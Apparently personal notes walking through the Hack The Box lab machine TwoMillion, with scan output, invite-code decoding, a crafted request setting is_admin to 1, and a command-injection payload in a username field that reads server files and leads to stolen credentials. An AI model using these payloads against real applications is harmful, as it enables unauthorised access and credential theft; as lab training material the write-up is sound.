"""
# Name:  TwoMillion
"""


"""
export PS1=" $"
export IP= 10.10.11.221
"""


"""
# Scanning :
 - Tool: NMAP 
 - results:
	  PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    nginx
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
                                                              
"""

domain enumeration: http://2million.htb/

"""
directory enumeration

technologies out :
	http://10.10.11.221 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.221], RedirectLocation[http://2million.htb/], Title[301 Moved Permanently], nginx
	http://2million.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTML5, HTTPServer[nginx], IP[10.10.11.221], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx
"""
js enumeration

path /invite
name: /inviteapi.min.js
 

dirb search:
GENERATED WORDS: 4612                                                          
"""
# Scanning URL: http://2million.htb/ 

	+ http://2million.htb/404                                                                                        
	+ http://2million.htb/api (                                                                                         
	- DIRECTORY: http://2million.htb/assets/                                                                                            
	- DIRECTORY: http://2million.htb/controllers/                                                                                       
	- DIRECTORY: http://2million.htb/css/                                                                                               
	- DIRECTORY: http://2million.htb/fonts/                                                                                             
	+ http://2million.htb/home (CODE:302|SIZE:0)                                                                                          
	- DIRECTORY: http://2million.htb/images/                                                                                            
	+ http://2million.htb/invite (CODE:200|SIZE:3859)                                                                                     
	- DIRECTORY: http://2million.htb/js/                                                                                                
"""   
"""
source code enumeration 

found filename: inviteapi.min.js

found the route : /invite
modified using https://beautifier.io/

"""

"""
# for getting invite hit the api in the js code found above with post request

```
$ curl -X POST 2million.htb/api/v1/invite/how/to/generate
```
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
  }

  -after applying ROT13 here we get:
  	--  In order to generate the invite code, make a POST request to /api/v1/invite/generate


  # after hitting we get the  encrypted message
```
curl -X POST 2million.htb/api/v1/invite/generate 
```
  {
  "0": 200,
  "success": 1,
  "data": {
    "code": "MVJPSlotOEQ0VVgtTERVWFMtNjJaQzc=",
    "format": "encoded"
  }
}

```
 echo "MVJPSlotOEQ0VVgtTERVWFMtNjJaQzc=" | base64 -d
```

   and the  invite code was in base64: 1ROJZ-8D4UX-LDUXS-62ZC7

```
 api endpoints
 	"v1":{"user":{"GET":{"/api/v1":"Route List","/api/v1/invite/how/to/generate":"Instructions on invite code generation","/api/v1/invite/generate":"Generate invite code","/api/v1/invite/verify":"Verify invite code","/api/v1/user/auth":"Check if user is authenticated","/api/v1/user/vpn/generate":"Generate a new VPN configuration","/api/v1/user/vpn/regenerate":"Regenerate VPN configuration","/api/v1/user/vpn/download":"Download OVPN file"},"POST":{"/api/v1/user/register":"Register a new user","/api/v1/user/login":"Login with existing user"}},"admin":{"GET":{"/api/v1/admin/auth":"Check if user is admin"},"POST":{"/api/v1/admin/vpn/generate":"Generate VPN for specific user"},"PUT":{"/api/v1/admin/settings/update":"Update user settings"

 ```
with proper indentation in file api.txt

**crafted request to modify prievleges or esacalate them 
```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=poj1gueqghtk53t3qeio4572kd
Content-Type: application/json   ---crafted after watching response
Content-Length: 54

{
  "email":"abc@gmail.com",
"is_admin":  1
}
```
**request for checking if we elevated prievleges
```
GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=2c6t8qrpoo4gd53h8qui5nr0ff
Connection: keep-alive
Content-Length: 0
```
Now we have here Well, we need an API that will require some input from us, and that also needs to access the underlying system. /api/v1/admin/vpn/generate seems to be the obvious choice!
request will be like 
```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=64o5toegi8v44i00bigi3kunj1
Content-Type: application/json
Content-Length: 55
Connection: keep-alive


{
	"username" : "fuckyou; cat Database.php #"
}

```
after command injection .env is commonly used in PHP applications to store environment variable values
so we cat out it and found creds to ssh and local database and gained ssh control

